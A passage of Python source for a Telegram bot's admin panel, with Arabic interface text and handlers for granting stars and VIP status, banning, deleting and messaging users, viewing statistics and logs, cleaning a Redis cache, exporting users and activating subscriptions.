        InlineKeyboardButton("⭐ 10", callback_data=f"admin_do_stars_{uid}_10"),
        InlineKeyboardButton("⭐ 25", callback_data=f"admin_do_stars_{uid}_25"),
        InlineKeyboardButton("⭐ 50", callback_data=f"admin_do_stars_{uid}_50"),
    )
    m.row(
        InlineKeyboardButton("⭐ 100", callback_data=f"admin_do_stars_{uid}_100"),
        InlineKeyboardButton("⭐ 250", callback_data=f"admin_do_stars_{uid}_250"),
    )
    m.row(
        InlineKeyboardButton("⭐ 500", callback_data=f"admin_do_stars_{uid}_500"),
        InlineKeyboardButton("⭐ 1000", callback_data=f"admin_do_stars_{uid}_1000"),
    )
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))

    safe_edit(call, text, reply_markup=m)


def _handle_do_stars(call, chat_id, data):
    """ينفذ إعطاء النجوم"""
    try:
        parts = data.replace("admin_do_stars_", "").rsplit("_", 1)
        uid = int(parts[0])
        amount = int(parts[1])
    except (ValueError, IndexError):
        return

    user = get_user(uid)
    if not user:
        safe_edit(call, "❌ المستخدم غير موجود")
        return

    # سجل
    try:
        from database import log_admin_action_db
        log_admin_action_db(
            admin_id=chat_id,
            target_id=uid,
            action="give_stars",
            amount=amount,
            reason="منحة نجوم من الأدمن"
        )
    except Exception as e:
        logger.warning(f"log_admin_action_db error: {e}")

    text = (
        f"✅ <b>تم إعطاء النجوم</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"⭐ <b>عدد النجوم:</b> <code>{amount}</code>"
    )

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("👤 المستخدم", callback_data=f"admin_user_{uid}"))

    safe_edit(call, text, reply_markup=m)

    # إشعار المستخدم
    try:
        bot.send_message(
            uid,
            f"🎉 <b>تم إعطاءك نجوم!</b>\n\n"
            f"⭐ <b>{amount}</b> نجمة\n\n"
            f"شكراً لاستخدامك البوت 🙏",
            parse_mode="HTML"
        )
    except Exception:
        pass

    logger.info(f"[ADMIN] {chat_id} gave {amount} stars to {uid}")


# ============================================================
# [6] 👑 إدارة الحساب
# ============================================================
def _handle_ban(call, data):
    try:
        uid = int(data.replace("admin_ban_user_", ""))
    except ValueError:
        return
    ban_user(uid)
    try:
        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=False)
    except Exception:
        pass
    user = get_user(uid)
    if user:
        safe_edit(
            call,
            _build_user_detail_text(uid, user),
            reply_markup=_build_user_detail_keyboard_v2(uid, user)
        )


def _handle_unban(call, data):
    try:
        uid = int(data.replace("admin_unban_user_", ""))
    except ValueError:
        return
    unban_user(uid)
    try:
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=False)
    except Exception:
        pass
    user = get_user(uid)
    if user:
        safe_edit(
            call,
            _build_user_detail_text(uid, user),
            reply_markup=_build_user_detail_keyboard_v2(uid, user)
        )


def _handle_grant_vip(call, data):
    try:
        uid = int(data.replace("admin_grant_vip_user_", ""))
    except ValueError:
        return
    u = get_or_create_user(uid)
    u["is_vip"] = True
    save_user(uid, u)
    try:
        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=False)
    except Exception:
        pass
    try:
        bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
    except Exception:
        pass
    user = get_user(uid)
    if user:
        safe_edit(
            call,
            _build_user_detail_text(uid, user),
            reply_markup=_build_user_detail_keyboard_v2(uid, user)
        )


def _handle_remove_vip(call, data):
    try:
        uid = int(data.replace("admin_remove_vip_", ""))
    except ValueError:
        return
    u = get_or_create_user(uid)
    u["is_vip"] = False
    save_user(uid, u)
    try:
        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=False)
    except Exception:
        pass
    user = get_user(uid)
    if user:
        safe_edit(
            call,
            _build_user_detail_text(uid, user),
            reply_markup=_build_user_detail_keyboard_v2(uid, user)
        )


def _handle_delete(call, data):
    try:
        uid = int(data.replace("admin_delete_user_", ""))
    except ValueError:
        return
    delete_user(uid)
    try:
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=False)
    except Exception:
        pass
    safe_edit(
        call,
        "🗑️ <b>تم الحذف بنجاح</b>",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 قائمة المستخدمين", callback_data="admin_users_0")
        )
    )


def _handle_msg_user(call, chat_id, data):
    try:
        uid = int(data.replace("admin_msg_user_", ""))
    except ValueError:
        return
    msg = bot.send_message(
        chat_id,
        f"📨 <b>أرسل الرسالة لـ</b> <code>{uid}</code>:",
        parse_mode="HTML"
    )
    from ..steps.admin_steps import admin_msg_user_handler
    bot.register_next_step_handler(msg, lambda m: admin_msg_user_handler(m, uid))


# ============================================================
# [7] ⚙️ الأدوات الإدارية
# ============================================================
def _handle_panel(call):
    try:
        from admin_system import build_advanced_admin_menu
        menu = build_advanced_admin_menu()
    except Exception:
        menu = build_admin_menu()
    safe_edit(call, "👑 <b>لوحة تحكم الأدمن</b>", reply_markup=menu)


def _handle_stats(call):
    try:
        from admin_system import build_admin_stats_text as adv_stats
        text = adv_stats()
    except Exception:
        text = build_admin_stats_text()
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_recent(call):
    users = get_all_users()
    users.sort(key=lambda u: str(u.get("created_at", "")), reverse=True)
    lines = ["🆕 <b>آخر 10 مستخدمين:</b>\n"]
    for u in users[:10]:
        uid = u.get("user_id")
        name = u.get("first_name", "Unknown")
        points = u.get("points", 0)
        if is_admin(uid):
            icon = "👑"
        elif u.get("is_vip"):
            icon = "💎"
        elif u.get("is_banned"):
            icon = "🚫"
        else:
            icon = "👤"
        lines.append(f"{icon} <b>{h(name)}</b> — <code>{uid}</code> — 💰 {points}")

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, "\n".join(lines), reply_markup=m)


def _handle_search(call, chat_id):
    msg = bot.send_message(
        chat_id,
        "🔍 <b>أرسل ID أو username:</b>",
        parse_mode="HTML"
    )
    from ..steps.admin_steps import admin_search_handler
    bot.register_next_step_handler(msg, admin_search_handler)


def _handle_broadcast(call, chat_id):
    msg = bot.send_message(
        chat_id,
        "📢 <b>أرسل الرسالة:</b>",
        parse_mode="HTML"
    )
    from ..steps.admin_steps import admin_broadcast_handler
    bot.register_next_step_handler(msg, admin_broadcast_handler)


def _handle_updates(call):
    """⚙️ إدارة التحديثات"""
    try:
        from ..keyboards import build_update_panel
        safe_edit(call, "⚙️ <b>إدارة التحديثات</b>", reply_markup=build_update_panel())
    except Exception as e:
        logger.warning(f"build_update_panel error: {e}")
        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
        safe_edit(call, "⚙️ <b>إدارة التحديثات</b>\n\n<i>غير متاح حالياً</i>", reply_markup=m)


def _handle_settings(call):
    """⚙️ الإعدادات"""
    text = (
        "⚙️ <b>إعدادات النظام</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 استخدم الأزرار للتحكم\n"
    )
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_live(call):
    try:
        from admin_system import build_live_monitor_text
        text = build_live_monitor_text()
    except Exception as e:
        text = f"❌ خطأ: {h(str(e)[:200])}"
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔄 تحديث", callback_data="admin_live"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_adv_stats(call):
    try:
        from admin_system import build_admin_stats_text as build_adv
        text = build_adv()
    except Exception:
        text = build_admin_stats_text()
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔄 تحديث", callback_data="admin_adv_stats"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_analytics(call):
    try:
        from admin_system import build_analytics_text
        text = build_analytics_text()
    except Exception as e:
        text = f"❌ خطأ: {h(str(e)[:200])}"
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔄 تحديث", callback_data="admin_analytics"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_top_users(call):
    try:
        from admin_system import build_top_users_text
        text = build_top_users_text()
    except Exception as e:
        text = f"❌ خطأ: {h(str(e)[:200])}"
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔄 تحديث", callback_data="admin_top_users"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_events(call):
    try:
        from admin_system import get_admin_events
        events = get_admin_events(limit=20)
    except Exception:
        events = []
    if not events:
        text = "📋 <b>سجل الأحداث</b>\n\n<i>لا يوجد أحداث بعد</i>"
    else:
        lines = ["📋 <b>آخر 20 حدث</b>\n━━━━━━━━━━━━━━━━━━\n"]
        for ev in events:
            ts = str(ev.get("time_str", "?"))[11:19]
            admin_id = ev.get("admin_id", "?")
            etype = ev.get("type", "?")
            lines.append(f"• <code>{h(ts)}</code> — <code>{h(str(admin_id))[:10]}</code> — <b>{h(etype)}</b>")
        text = "\n".join(lines)
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔄 تحديث", callback_data="admin_events"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_activity_log(call):
    try:
        from admin_system import get_recent_activity
        activities = get_recent_activity(limit=20)
    except Exception:
        activities = []
    if not activities:
        text = "📡 <b>سجل الأنشطة</b>\n\n<i>لا يوجد</i>"
    else:
        lines = ["📡 <b>آخر 20 نشاط</b>\n━━━━━━━━━━━━━━━━━━\n"]
        for ev in activities:
            ts = str(ev.get("time_str", "?"))[11:19]
            uid = ev.get("user_id", "?")
            action = ev.get("action", "?")
            lines.append(f"• <code>{h(ts)}</code> — <code>{h(str(uid))[:10]}</code> — <b>{h(action)}</b>")
        text = "\n".join(lines)
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔄 تحديث", callback_data="admin_activity_log"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_clean_redis(call):
    try:
        from admin_system import clean_redis_cache
        result = clean_redis_cache()
        text = (
            "🧹 <b>تنظيف Redis</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ <b>تم حذف:</b> <code>{result['cleaned']}</code> مفتاح\n"
            f"❌ <b>أخطاء:</b> <code>{result['errors']}</code>\n"
        )
    except Exception as e:
        text = f"❌ خطأ: {h(str(e)[:200])}"
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    safe_edit(call, text, reply_markup=m)


def _handle_export(call, chat_id):
    try:
        from admin_system import export_all_users
        json_data = export_all_users()
        if not json_data:
            return
        import io
        buf = io.BytesIO(json_data.encode('utf-8'))
        buf.name = "users_export.json"
        bot.send_document(chat_id, buf, caption="📥 <b>تصدير كل المستخدمين</b>", parse_mode="HTML")
        safe_edit(
            call,
            "✅ تم إرسال الملف",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
            )
        )
    except Exception as e:
        safe_edit(
            call,
            f"❌ خطأ: {h(str(e)[:200])}",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
            )
        )


def _handle_give_sub_prompt(call, data):
    try:
        uid = int(data.replace("admin_give_sub_", ""))
    except ValueError:
        return
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
        InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
    )
    m.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
    m.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
    safe_edit(call, f"📅 <b>اختر الباقة</b> <code>{uid}</code>", reply_markup=m)


def _handle_activate_sub(call, data):
    parts = data.replace("admin_activate_", "").rsplit("_", 1)
    if len(parts) != 2:
        return
    plan_key, uid_str = parts
    try:
        uid = int(uid_str)
    except ValueError:
        return
    try:
        user = activate_subscription(uid, plan_key)
        plan = PRICING_PLANS.get(plan_key)
        if not plan:
            try:
                bot.answer_callback_query(call.id, "❌ باقة غير صالحة", show_alert=True)
            except Exception:
                pass
            return
        try:
            bot.answer_callback_query(call.id, f"✅ {plan['name']}", show_alert=False)
        except Exception:
            pass
        try:
            from datetime import datetime
            expires = datetime.fromisoformat(user["subscription"]["expires_at"])
            bot.send_message(
                uid,
                f"🎉 <b>تم تفعيل اشتراكك!</b>\n"
                f"📅 ينتهي: <code>{expires.strftime('%Y-%m-%d')}</code>",
                parse_mode="HTML"
            )
        except Exception:
            pass
    except Exception as e:
        logger.exception(f"activate_subscription error: {e}")
